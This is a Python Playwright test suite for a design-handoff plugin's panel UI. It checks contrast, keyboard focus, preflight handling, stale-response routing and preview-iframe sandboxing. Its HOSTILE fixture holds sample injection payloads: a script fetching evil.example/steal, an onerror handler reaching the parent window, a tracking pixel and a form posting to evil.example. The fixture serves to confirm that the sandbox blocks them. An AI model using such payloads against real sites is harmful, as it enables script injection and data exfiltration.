#!/usr/bin/env python3
"""
Browser checks for the plugin UI. Install axe-core with npm ci, then run:
  python -m pip install -r tests/requirements-browser.txt
  python -m playwright install chromium
  npm run test:browser

1. The panel renders without JS errors and has no detected axe text-contrast
   violations in representative fallback and simulated Figma light/dark states.
2. Menus, selectable layers and forms support keyboard use and focus restoration.
3. Handoff preflight presents incomplete/unknown results and ignores stale replies.
4. The HTML preview iframe is isolated: scripts and event handlers in generated
   HTML don't run, it can't reach the parent, and it makes no network requests
   except public Google Fonts (none at all in offline mode).
5. The panel can still measure the preview (same-origin, no scripts).
"""
import os, pathlib, sys, json, subprocess
from playwright.sync_api import sync_playwright

ROOT = pathlib.Path(__file__).resolve().parent.parent
UI = (ROOT / 'devready-plugin' / 'ui.html').as_uri()
AXE = ROOT / 'node_modules' / 'axe-core' / 'axe.min.js'
HOSTILE = """<!DOCTYPE html><html><head><title>t</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400&display=swap" rel="stylesheet" />
</head><body>
<div class="root" style="width:300px;height:900px;background:#eee">tall content</div>
<script>window.parent.__pwned = 'script'; fetch('https://evil.example/steal');</script>
<img src="x" onerror="window.parent.__pwned='onerror'">
<img src="https://evil.example/pixel.png">
<form action="https://evil.example/post"><button>go</button></form>
</body></html>"""

failures = []
def check(name, ok, detail=''):
    print(('  \u2713 ' if ok else '  \u2717 ') + name + (('  — ' + detail) if detail else ''))
    if not ok: failures.append(name)

def contrast_violations(pg):
    # The coloured "Aa" chips intentionally reproduce the design's own failing
    # contrast; generated previews are not the plugin chrome. Check everything else.
    return pg.evaluate("""async () => {
      const context = { exclude: [['.a-sw'], ['iframe']] };
      const r = await axe.run(context, { runOnly: { type: 'rule', values: ['color-contrast'] } });
      return r.violations.flatMap(v => v.nodes.map(n => ({ target: n.target, summary: n.failureSummary })));
    }""")

def text_contrast(pg, selector, pseudo=None, background=None):
    # axe may skip placeholders and disabled controls. Composite their actual
    # foreground over the rendered background and measure WCAG contrast.
    return pg.evaluate("""opts => {
      const el = document.querySelector(opts.selector), text = getComputedStyle(el, opts.pseudo);
      const bgStyle = getComputedStyle(opts.background ? document.querySelector(opts.background) : el);
      const ctx = document.createElement('canvas').getContext('2d');
      ctx.fillStyle = bgStyle.backgroundColor; ctx.fillRect(0, 0, 1, 1);
      const bg = Array.from(ctx.getImageData(0, 0, 1, 1).data).slice(0, 3);
      ctx.globalAlpha = Number(text.opacity); ctx.fillStyle = text.color; ctx.fillRect(0, 0, 1, 1);
      const fg = Array.from(ctx.getImageData(0, 0, 1, 1).data).slice(0, 3);
      const lum = rgb => rgb.map(x => { x /= 255; return x <= .04045 ? x / 12.92 : ((x + .055) / 1.055) ** 2.4; })
        .reduce((sum, x, i) => sum + x * [0.2126, 0.7152, 0.0722][i], 0);
      const a = lum(fg), b = lum(bg); return (Math.max(a, b) + .05) / (Math.min(a, b) + .05);
    }""", {'selector': selector, 'pseudo': pseudo, 'background': background})

def figma_tokens(pg, theme):
    # Representative host tokens, including the low-contrast secondary and tertiary
    # text colors that Figma can supply; this is not a substitute for live Figma.
    pg.evaluate("""theme => {
      const light = { bg: '#ffffff', bg2: '#f5f5f5', bg3: '#e6e6e6', fg: '#1a1a1a', fg2: 'rgba(0,0,0,.5)', fg3: 'rgba(0,0,0,.3)',
        brandText: '#007be5', greenText: '#009951', greenTint: '#cff7d3', warnText: '#b86200', warnTint: '#fff1e3', dangerText: '#dc3412', dangerTint: '#ffe2e0', purple: '#9747ff' };
      const dark = { bg: '#2c2c2c', bg2: '#383838', bg3: '#444444', fg: '#ffffff', fg2: 'rgba(255,255,255,.7)', fg3: 'rgba(255,255,255,.4)',
        brandText: '#7cc4f8', greenText: '#79d297', greenTint: '#1a4a2e', warnText: '#f5a455', warnTint: '#4b3824', dangerText: '#ffaaa0', dangerTint: '#52281f', purple: '#d6b6fb' };
      const t = theme === 'dark' ? dark : light, root = document.documentElement;
      root.classList.remove('figma-light', 'figma-dark');
      root.classList.add('figma-' + theme);
      const vars = { '--figma-color-bg': t.bg, '--figma-color-bg-secondary': t.bg2, '--figma-color-bg-tertiary': t.bg3,
        '--figma-color-text': t.fg, '--figma-color-text-secondary': t.fg2, '--figma-color-text-tertiary': t.fg3,
        '--figma-color-text-brand': t.brandText, '--figma-color-bg-brand': '#0d99ff', '--figma-color-bg-success': '#14ae5c',
        '--figma-color-text-success': t.greenText, '--figma-color-bg-success-tertiary': t.greenTint,
        '--figma-color-text-warning': t.warnText, '--figma-color-bg-warning-tertiary': t.warnTint,
        '--figma-color-text-danger': t.dangerText, '--figma-color-bg-danger-tertiary': t.dangerTint,
        '--figma-color-text-component': t.purple };
      Object.entries(vars).forEach(([k, v]) => root.style.setProperty(k, v));
    }""", theme)

with sync_playwright() as p:
    # Normally use Playwright's bundled Chromium. An explicit override is useful
    # in restricted environments, but may not match Playwright's tested version.
    b = p.chromium.launch(executable_path=os.environ.get('DEVREADY_TEST_CHROMIUM') or None)
    print('ui render')
    for scheme in ['light', 'dark']:
        pg = b.new_page(viewport={'width': 480, 'height': 820}, color_scheme=scheme)
        errs = []
        pg.on('pageerror', lambda e: errs.append(str(e)))
        pg.goto(UI); pg.wait_for_function("typeof S !== 'undefined' && S.data && S.data.spec", timeout=8000); pg.wait_for_timeout(300)
        n = pg.evaluate("document.querySelectorAll('#main .sec').length")
        check('sample data renders (' + scheme + ')', not errs and n > 8, f'{n} sections, errors: {errs[:2]}')
        pg.close()

    print('panel text contrast')
    for label, scheme, host_theme in [('light', 'light', None), ('dark', 'dark', None), ('Figma light', 'dark', 'light'), ('Figma dark', 'light', 'dark')]:
        # A tall viewport keeps all expanded panel sections in the scan area.
        pg = b.new_page(viewport={'width': 480, 'height': 9000}, color_scheme=scheme)
        pg.goto(UI); pg.wait_for_function("typeof S !== 'undefined' && S.data && S.data.spec", timeout=8000)
        if host_theme: figma_tokens(pg, host_theme)
        expected_bg = 'rgb(44, 44, 44)' if (host_theme or scheme) == 'dark' else 'rgb(255, 255, 255)'
        check('expected host or fallback theme is applied (' + label + ')', pg.evaluate('getComputedStyle(document.body).backgroundColor') == expected_bg)
        pg.evaluate("S.closed = {}; S.form = 'res'; S.data.count = 2; S.data.status.source = 'plugin'; S.data.spec.layers.children[0].visible = false; S.exp = {fmt:'SVG',scale:2}; render()")
        fits = pg.evaluate("() => { const m = document.querySelector('#main'); return m.scrollHeight <= m.clientHeight; }")
        check('expanded inspector fits the contrast scan viewport (' + label + ')', fits)
        hidden = pg.locator('#main [data-select][aria-label*="Hidden"]').first
        check('hidden layers remain legible and are labelled (' + label + ')', hidden.count() > 0 and hidden.evaluate('el => getComputedStyle(el).opacity') == '1')
        pg.add_script_tag(path=str(AXE))
        if label == 'light':
            pg.evaluate("document.querySelector('#hdr .name').style.color = '#aaaaaa'")
            negative = contrast_violations(pg)
            check('contrast scanner catches a deliberately unreadable heading', any('name' in str(v['target']) for v in negative))
            pg.evaluate("document.querySelector('#hdr .name').style.color = ''")
        bad = contrast_violations(pg)
        check('inspector text meets contrast checks (' + label + ')', not bad, json.dumps(bad[:3]) if bad else '')
        ratio = text_contrast(pg, '#res-url', pseudo='::placeholder')
        check('input placeholder has at least 4.5:1 contrast (' + label + ')', ratio >= 4.5, f'{ratio:.2f}:1')
        ratio = text_contrast(pg, '.exp-sc.dis')
        check('disabled export scale remains legible (' + label + ')', pg.locator('.exp-sc.dis').is_disabled() and ratio >= 4.5, f'{ratio:.2f}:1')
        pg.locator('[data-act="code-menu"]').first.focus(); pg.keyboard.press('Enter')
        bad = contrast_violations(pg)
        check('focused menu text meets contrast checks (' + label + ')', not bad, json.dumps(bad[:3]) if bad else '')
        pg.keyboard.press('Escape')
        pg.evaluate('S.data.isDev = true; render()')
        pg.locator('[data-act="more-menu"]').first.focus(); pg.keyboard.press('Enter')
        ratio = text_contrast(pg, '#menu .mi.dis', background='#menu')
        check('disabled menu items remain legible (' + label + ')', pg.locator('#menu .mi.dis:disabled').count() == 2 and ratio >= 4.5, f'{ratio:.2f}:1')
        pg.keyboard.press('Escape'); pg.evaluate('S.data.isDev = false; render()')
        # Exercise generated-code syntax colours and Google, custom and system font badges.
        pg.evaluate("""() => {
          S.lang = 'html-css'; S.code[S.lang] = structuredClone(DEMO_CODE[S.lang]);
          S.code[S.lang].fonts.push({family:'LocalFont',source:'custom',variants:[{key:'0,400',weight:400,style:'Regular',uploaded:true}]},
            {family:'SystemFont',source:'system',kind:'sans',variants:[]});
          render();
        }""")
        bad = contrast_violations(pg)
        check('generated code and font labels meet contrast checks (' + label + ')', not bad, json.dumps(bad[:3]) if bad else '')
        ratio = text_contrast(pg, '.fvar.ok .x', background='.fvar.ok')
        check('font removal control remains legible (' + label + ')', ratio >= 4.5, f'{ratio:.2f}:1')
        pg.evaluate("S.lang = 'swiftui'; S.code.swiftui = DEMO_CODE.swiftui; render()")
        bad = contrast_violations(pg)
        check('native syntax colours meet contrast checks (' + label + ')', not bad, json.dumps(bad[:3]) if bad else '')
        pg.evaluate("""() => {
          window.onmessage({data:{pluginMessage:{type:'state',mode:'locked',node:{id:'1:3',name:'Layer',type:'TEXT'},
            target:{id:'1:2',name:'Frame',type:'FRAME'},ready:[],isDev:false,
            settings:{gate:'strict',unit:'px',remBase:16,colorFormat:'hex',pluginFlag:true,previewFonts:'off'}}}});
          S.preflight={id:'1:2',requestId:1,busy:false,stale:true,out:{
            accessibility:{counts:{fail:2,warn:1,unknown:3,pass:5},unmeasured:{background:1,textFill:1,textStyle:1},assumed:2,scanned:400,limited:true},
            layers:{scanned:1501,limited:true,limit:1501},missingFonts:1,uncheckedFonts:2}}; render();
        }""")
        bad = contrast_violations(pg)
        check('handoff text and controls meet contrast checks (' + label + ')', not bad, json.dumps(bad[:3]) if bad else '')
        ratio = text_contrast(pg, '#note', pseudo='::placeholder')
        check('handoff note placeholder has at least 4.5:1 contrast (' + label + ')', ratio >= 4.5, f'{ratio:.2f}:1')
        pg.evaluate("S.preflight = {id:'1:2',requestId:2,busy:true}; render()")
        bad = contrast_violations(pg)
        check('pending handoff control remains legible (' + label + ')', not bad, json.dumps(bad[:3]) if bad else '')
        if host_theme:
            next_theme = 'dark' if host_theme == 'light' else 'light'
            figma_tokens(pg, next_theme)
            bad = contrast_violations(pg)
            switched_bg = 'rgb(44, 44, 44)' if next_theme == 'dark' else 'rgb(255, 255, 255)'
            check('host theme changes are reflected without a reload (' + label + ')', pg.evaluate('getComputedStyle(document.body).backgroundColor') == switched_bg and not bad, json.dumps(bad[:3]) if bad else '')
        pg.close()

    print('keyboard navigation')
    pg = b.new_page(viewport={'width': 480, 'height': 820})
    pg.goto(UI); pg.wait_for_function("typeof S !== 'undefined' && S.data && S.data.spec", timeout=8000)
    pg.evaluate("S.data.spec.canAnnotate = true; S.closed.Annotations = false; render()")
    pg.mouse.move(0, 0); pg.keyboard.press('Tab')
    for label, selector in [('resource removal', '.res-row .x'), ('annotation removal', '.ann .x'), ('code copy', '.code .copy-float')]:
        control = pg.locator(selector).first
        if control.count(): control.focus()
        visible_focus = control.count() and control.evaluate("el => el.matches(':focus-visible') && getComputedStyle(el).opacity === '1'")
        check(label + ' action is visible when keyboard-focused', bool(visible_focus))
    menu = pg.locator('[data-act="lang-menu"]').first
    menu.focus(); pg.keyboard.press('Enter')
    check('Enter opens menu and focuses its first item', menu.get_attribute('aria-expanded') == 'true' and pg.evaluate("document.activeElement.matches('#menu [role=menuitemradio]')"))
    check('menu exposes the selected language as checked', pg.locator('#menu [role="menuitemradio"]').first.get_attribute('aria-checked') == 'true')
    pg.keyboard.press('ArrowDown'); pg.keyboard.press('Enter')
    check('arrow keys and Enter select a language', pg.evaluate("S.lang === 'tailwind'"))
    check('focus returns to the menu trigger after selection', pg.evaluate("document.activeElement.matches('[data-act=lang-menu]')"))
    menu.focus(); pg.keyboard.press('Enter'); pg.keyboard.press('Escape')
    check('Escape closes the menu and restores focus', not pg.locator('#menu').is_visible() and pg.evaluate("document.activeElement.matches('[data-act=lang-menu]')"))
    menu.focus(); pg.keyboard.press('Enter'); pg.evaluate('render()')
    check('an asynchronous re-render closes the menu and restores its trigger', not pg.locator('#menu').is_visible() and pg.evaluate("document.activeElement.matches('[data-act=lang-menu]')") and menu.get_attribute('aria-expanded') == 'false')
    menu.focus(); pg.keyboard.press('ArrowUp')
    check('ArrowUp opens the menu on its last item', pg.evaluate("document.activeElement.textContent.includes('Flutter')"))
    pg.keyboard.press('Tab')
    check('Tab closes the menu and moves beyond its trigger', not pg.locator('#menu').is_visible() and pg.evaluate("!document.activeElement.matches('[data-act=lang-menu], #menu *')"))
    pg.set_viewport_size({'width': 480, 'height': 240})
    menu.focus(); pg.keyboard.press('ArrowDown'); pg.keyboard.press('End')
    visible = pg.evaluate("""() => { const m = document.querySelector('#menu').getBoundingClientRect(), i = document.activeElement.getBoundingClientRect(); return i.top >= m.top && i.bottom <= m.bottom && m.bottom <= innerHeight; }""")
    check('long menus scroll the focused option into view on a short panel', visible)
    pg.keyboard.press('Escape'); pg.set_viewport_size({'width': 480, 'height': 820})
    settings = pg.locator('[data-act="more-menu"]').first
    settings.focus(); pg.keyboard.press('Enter')
    check('settings expose their checked state to assistive technology', pg.locator('#menu [role="menuitemcheckbox"]').count() >= 3 and pg.locator('#menu [role="menuitemcheckbox"]').first.get_attribute('aria-checked') in ['true', 'false'])
    pg.keyboard.press('Escape')
    section = pg.locator('[data-act="sec-toggle"][data-key="Layers"]')
    section.focus(); pg.keyboard.press('Space')
    check('sections toggle and retain focus after re-render', section.get_attribute('aria-expanded') == 'true' and pg.evaluate("document.activeElement.getAttribute('data-key') === 'Layers'"))
    pg.evaluate("window.__sent = []; window.send = m => window.__sent.push(m); S.demo = false")
    layer = pg.locator('[data-select][role="button"]').first
    layer_id = layer.get_attribute('data-select'); layer.focus(); pg.keyboard.press('Enter')
    check('layer rows can be selected by keyboard', pg.evaluate("id => window.__sent.some(m => m.type === 'select' && m.id === id)", layer_id))
    pg.evaluate("window.__copied = null; window.copy = value => { window.__copied = value; }")
    copy = pg.locator('[data-copy][role="button"]').first
    value = copy.get_attribute('data-copy'); copy.focus(); pg.keyboard.press('Space')
    check('copy chips respond to the Space key', pg.evaluate('window.__copied') == value)
    nested = pg.locator('[role="button"] [role="button"], [role="button"] button, button [role="button"]').count()
    check('asset actions do not nest interactive controls', nested == 0, str(nested))
    asset = pg.locator('.asset-main[data-export]').first
    asset_id = asset.get_attribute('data-export'); asset.focus(); pg.keyboard.press('Space')
    select_asset = pg.locator('.arow button[data-select]').first
    select_id = select_asset.get_attribute('data-select'); select_asset.focus(); pg.keyboard.press('Enter')
    check('asset export and selection both work by keyboard', pg.evaluate("ids => window.__sent.some(m => m.type === 'export' && m.id === ids[0]) && window.__sent.some(m => m.type === 'select' && m.id === ids[1])", [asset_id, select_id]))
    pg.locator('[data-act="form-res"]').first.click()
    pg.locator('#res-url').fill('https://example.com/button'); pg.locator('#res-name').fill('Button docs')
    pg.locator('#res-url').focus(); pg.evaluate("document.querySelector('#res-url').setSelectionRange(8, 15)"); pg.evaluate('render()')
    check('form drafts, focus and caret survive a same-selection re-render', pg.locator('#res-name').input_value() == 'Button docs' and pg.locator('#res-url').input_value() == 'https://example.com/button' and pg.evaluate("document.activeElement.id === 'res-url' && document.activeElement.selectionStart === 8 && document.activeElement.selectionEnd === 15"))
    pg.locator('[data-act="form-cancel"]').first.click()
    layer.focus(); pg.keyboard.press('Enter')
    pg.evaluate("window.onmessage({data:{pluginMessage:{type:'state',mode:'empty',ready:[],page:'New selection',isDev:false,settings:{gate:'strict',unit:'px',remBase:16,colorFormat:'hex',pluginFlag:true,previewFonts:'off'}}}})")
    check('focus falls back to the new selection when the row disappears', pg.evaluate("document.activeElement.matches('#hdr .name') && document.activeElement.textContent === 'New selection'"))
    pg.close()

    print('handoff preflight')
    pg = b.new_page(viewport={'width': 480, 'height': 820})
    pg.goto(UI); pg.wait_for_function("typeof S !== 'undefined' && S.data && S.data.spec", timeout=8000)
    pg.evaluate("""() => {
        window.__sent = []; window.send = m => window.__sent.push(m);
        window.lockedState = id => ({ type: 'state', mode: 'locked', node: { id: id + ':1', name: 'Layer', type: 'TEXT' },
          target: { id, name: 'Frame', type: 'FRAME' }, ready: [], isDev: true,
          settings: { gate: 'strict', unit: 'px', remBase: 16, colorFormat: 'hex', pluginFlag: true, previewFonts: 'off' } });
        window.onmessage({ data: { pluginMessage: window.lockedState('1:2') } });
    }""")
    pg.locator('#note').fill('Keep this handoff note')
    pg.locator('[data-act="preflight"]').focus(); pg.keyboard.press('Enter')
    request = pg.evaluate("window.__sent.find(m => m.type === 'preflight')")
    check('preflight runs only on request and includes target identity', bool(request) and request['id'] == '1:2' and request['requestId'] > 0, str(request))
    pg.keyboard.press('Enter')
    check('a pending preflight cannot be submitted twice', pg.evaluate("window.__sent.filter(m => m.type === 'preflight').length === 1"))
    pg.evaluate("""request => {
        const out = { accessibility: { counts: { fail: 1, warn: 2, unknown: 1, pass: 4 }, unmeasured: { background: 1, textFill: 0, textStyle: 0 }, assumed: 2, scanned: 400, limited: true },
          layers: { scanned: 1501, limited: true, limit: 1501 }, missingFonts: 1, uncheckedFonts: 2 };
        window.onmessage({ data: { pluginMessage: { type: 'preflight', id: request.id, requestId: request.requestId, out } } });
    }""", request)
    content = pg.locator('.preflight').inner_text()
    check('preflight displays findings, unknowns and limits', all(s in content for s in ['1 failing', '1 unmeasured', '1 background', 'stopped at 400', 'assumed a white background', 'Font scan is incomplete', '1501+', 'may truncate', 'could not be checked']))
    check('preflight preserves the note and keyboard focus', pg.locator('#note').input_value() == 'Keep this handoff note' and pg.evaluate("document.activeElement.matches('[data-act=preflight]')"))
    pg.locator('[data-act="mark"]').click()
    mark = pg.evaluate("window.__sent.find(m => m.type === 'mark')")
    check('mark ready remains optional and retains the note', bool(mark) and mark['id'] == '1:2' and mark['note'] == 'Keep this handoff note', str(mark))
    pg.evaluate("window.onmessage({data:{pluginMessage:window.lockedState('1:2')}})")
    check('preflight results become stale after a state refresh', 'may have changed' in pg.locator('.preflight').inner_text())
    pg.locator('[data-act="preflight"]').click()
    old_request = pg.evaluate("window.__sent.filter(m => m.type === 'preflight').slice(-1)[0]")
    pg.evaluate("request => window.onmessage({data:{pluginMessage:{type:'preflight',id:request.id,requestId:request.requestId,out:{}}}})", request)
    check('an old response cannot replace a newer preflight request', pg.evaluate("S.preflight.busy && S.preflight.requestId !== " + str(request['requestId'])))
    pg.evaluate("request => { window.onmessage({data:{pluginMessage:window.lockedState('3:4')}}); window.onmessage({data:{pluginMessage:{type:'preflight',id:request.id,requestId:request.requestId,out:{}}}}); }", old_request)
    check('stale preflight responses do not cross selections', pg.evaluate("S.preflight === null") and pg.locator('#note').input_value() == '')
    pg.locator('#note').fill('Skip the check'); pg.locator('[data-act="mark"]').click()
    check('a frame can be marked ready without running preflight', pg.evaluate("window.__sent.filter(m => m.type === 'mark').some(m => m.id === '3:4' && m.note === 'Skip the check') && window.__sent.filter(m => m.type === 'preflight').length === 2"))
    pg.locator('[data-act="preflight"]').click()
    pg.evaluate("""() => { const r = window.__sent.filter(m => m.type === 'preflight').slice(-1)[0]; window.onmessage({data:{pluginMessage:{type:'preflight',id:r.id,requestId:r.requestId,error:'Selection changed — try again.'}}}); }""")
    check('preflight errors are visible and can be retried', 'Selection changed' in pg.locator('.preflight').inner_text() and pg.locator('[data-act="preflight"]').inner_text() == 'Run again' and pg.locator('#note').input_value() == 'Skip the check')
    pg.close()

    print('export and code routing')
    pg = b.new_page(viewport={'width': 480, 'height': 820})
    pg.goto(UI); pg.wait_for_function("typeof S !== 'undefined' && S.data && S.data.spec", timeout=8000)
    sent = pg.evaluate("""() => {
        const sent = []; window.send = m => sent.push(m); S.demo = false;
        S.data.assets = [{ id: 'root', kind: 'selection' }, { id: 'icon', kind: 'icon' }];
        S.assetFmt = 'PNG:2';
        const button = document.querySelector('[data-act="export-all"]');
        if (button) button.click();
        return sent;
    }""")
    items = sent[0].get('items', []) if sent else []
    check('Export all matches the visible Assets list', len(items) == 1 and items[0].get('id') == 'icon', str(sent))
    routed = pg.evaluate("""() => {
        const sent = []; window.send = m => sent.push(m); S.demo = false;
        S.lang = 'html-css'; S.view = 'code'; S.code = {}; pending = {};
        S.codeFor = 'old'; S.data.spec.id = 'old'; requestCode('html-css');
        S.codeFor = 'new'; S.data.spec.id = 'new'; pending = {}; requestCode('html-css');
        const oldRequest = sent[0], newRequest = sent[1];
        const payload = text => ({ files: [{ name: 'x.css', lang: 'css', code: text }], assets: [], stats: {} });
        window.onmessage({ data: { pluginMessage: { type: 'code', lang: 'html-css', requestId: oldRequest.requestId, nodeId: 'old', out: payload('old') } } });
        const staleIgnored = !S.code['html-css'];
        const currentMessage = { type: 'code', lang: 'html-css', requestId: newRequest.requestId, nodeId: 'new', out: payload('new') };
        window.onmessage({ data: { pluginMessage: currentMessage } });
        const currentAccepted = S.code['html-css'] && S.code['html-css'].files[0].code === 'new';
        S.code = {}; S.codeFor = ''; pending = {};
        window.onmessage({ data: { pluginMessage: currentMessage } });
        const clearedIgnored = !S.code['html-css'];
        S.codeFor = 'new'; S.code = {}; pending = {};
        window.onmessage({ data: { pluginMessage: currentMessage } });
        const unrequestedIgnored = !S.code['html-css'];
        return { staleIgnored, currentAccepted, clearedIgnored, unrequestedIgnored, sent };
    }""")
    check('stale out-of-order code is ignored', routed['staleIgnored'], str(routed))
    check('current code response is accepted', routed['currentAccepted'], str(routed))
    check('responses for a cleared selection are ignored', routed['clearedIgnored'], str(routed))
    check('responses without a pending request are ignored', routed['unrequestedIgnored'], str(routed))
    pg.close()

    print('generated paint order')
    paint_script = r"""
const { createBuilders, loadEngine } = require('./tests/harness');
(async () => {
  const B = createBuilders();
  const row = B.R('Overlapping row', 280, 80, { background: '#EEE' }, { ax: 10, ay: 210, layoutPositioning: 'ABSOLUTE' });
  const nav = B.R('Bottom navbar', 300, 64, { background: '#FFF' }, { ax: 0, ay: 236 });
  const root = B.AL('Screen', 'VERTICAL', { 'justify-content': 'flex-end', width: '300px', height: '300px' }, [row, nav], { width: 300, height: 300 });
  root.parent = { type: 'PAGE' };
  const out = await loadEngine(B).generateCode(root, 'html-single', 'px', 16, 600, {});
  process.stdout.write(JSON.stringify(out.files[0].code));
})().catch(e => { console.error(e); process.exit(1); });
"""
    generated = json.loads(subprocess.check_output(['node', '-e', paint_script], cwd=ROOT, text=True))
    pg = b.new_page(viewport={'width': 300, 'height': 300})
    pg.set_content(generated)
    hit = pg.evaluate("""() => {
        const nav = document.querySelector('.screen__bottom-navbar').getBoundingClientRect();
        const row = document.querySelector('.screen__overlapping-row').getBoundingClientRect();
        const x = Math.max(nav.left, row.left) + 10, y = Math.max(nav.top, row.top) + 10;
        return { className: document.elementFromPoint(x, y)?.className || '', x, y, nav: nav.toJSON(), row: row.toJSON() };
    }""")
    check('generated navbar paints above the overlapping row', 'bottom-navbar' in hit['className'], str(hit))
    pg.close()

    print('preview isolation')
    for online in [True, False]:
        pg = b.new_page(viewport={'width': 480, 'height': 820})
        reqs, errs = [], []
        pg.on('pageerror', lambda e: errs.append(str(e)))
        # Only requests that get past CSP reach the router. Record them, then abort so the
        # test is hermetic. (Chromium reports CSP-blocked loads as 'request' + failure 'csp';
        # those never reach the network, so they are correctly not counted here.)
        def router(route):
            u = route.request.url
            if u.startswith('file:') or u.startswith('data:'): return route.continue_()
            reqs.append(u); route.abort()
        pg.route('**/*', router)
        pg.goto(UI); pg.wait_for_function("typeof S !== 'undefined' && S.data && S.data.spec", timeout=8000)
        pg.evaluate("""([html, online]) => {
            S.demo = false;                       // exercise the real (online/offline) path
            window.send = () => {};               // no Figma host in the browser
            S.data.settings.previewFonts = online ? 'google' : 'off';
            S.code['html-single'] = { files: [{ name: 'x.html', lang: 'html', code: html }], preview: { w: 300, h: 200 }, assets: [], stats: {} };
            S.lang = 'html-css'; S.view = 'preview'; S.cmp = 'preview'; render();
        }""", [HOSTILE, online])
        pg.wait_for_timeout(1500)
        label = 'online' if online else 'offline'
        f = pg.query_selector('#pv-frame')
        check(f'[{label}] iframe is sandboxed without allow-scripts', f is not None and f.get_attribute('sandbox') == 'allow-same-origin', f.get_attribute('sandbox') if f else 'no iframe')
        pwned = pg.evaluate("window.__pwned || null")
        check(f'[{label}] scripts / onerror in generated HTML do not run', pwned is None, str(pwned))
        evil = [u for u in reqs if 'evil.example' in u]
        check(f'[{label}] no requests to other hosts', not evil, ', '.join(evil[:3]))
        g = [u for u in reqs if 'fonts.g' in u]
        if online: check('[online] only public Google Fonts may load', all('fonts.googleapis.com' in u or 'fonts.gstatic.com' in u for u in g), f'{len(g)} font requests')
        else: check('[offline] no Google Fonts requests', not g, ', '.join(g[:2]))
        h = pg.evaluate("parseInt(document.getElementById('pv-frame').style.height)")
        check(f'[{label}] panel can still measure the preview height', h >= 900, f'{h}px')
        check(f'[{label}] no JS errors in the panel', not errs, '; '.join(errs[:2]))
        pg.close()
    b.close()

print('\n' + ('all passed' if not failures else f'{len(failures)} failed'))
sys.exit(1 if failures else 0)
